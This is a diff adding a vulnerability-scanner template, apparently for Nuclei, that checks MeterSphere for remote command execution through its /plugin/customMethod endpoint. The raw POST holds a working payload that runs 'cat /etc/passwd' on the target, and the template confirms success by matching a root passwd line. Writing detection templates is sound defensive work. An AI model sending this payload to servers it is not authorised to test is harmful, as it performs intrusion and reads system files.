@@ -1,0 +1,26 @@
+id: metersphere-custommethod-rce
+info:
+  name: MeterSphere Plugin CustomMethod RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Detects a remote command execution vulnerability in MeterSphere via the /plugin/customMethod endpoint.
+  reference:
+    - https://xz.aliyun.com/t/10772
+http:
+  - raw:
+      - |
+        POST /plugin/customMethod HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"entry": "Evil", "request": "cat /etc/passwd"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:[x*]:0:0:"
+        part: body
